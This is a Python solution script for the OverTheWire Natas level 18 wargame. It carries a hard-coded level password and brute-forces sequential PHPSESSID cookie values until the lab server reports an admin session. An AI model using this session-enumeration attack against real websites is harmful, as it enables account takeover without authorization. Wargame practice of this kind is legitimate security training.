import requests

pattern = 'You are an admin. The credentials for the next level are'
natas18_username = 'natas18'
natas18_passwd = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
resID = 0 
url = 'http://natas18.natas.labs.overthewire.org/'

for i in range(1, 641):
    res = requests.post(url, auth=(natas18_username, natas18_passwd), cookies=dict(PHPSESSID=str(i)))
    if pattern in res.text:
        print('Session ' + str(i) + ' is good!')
        resID = i
        break
    else:
        print('Session ' + str(i) + ' is bad!')
print('RESULT: Session ' + str(resID) + '.')
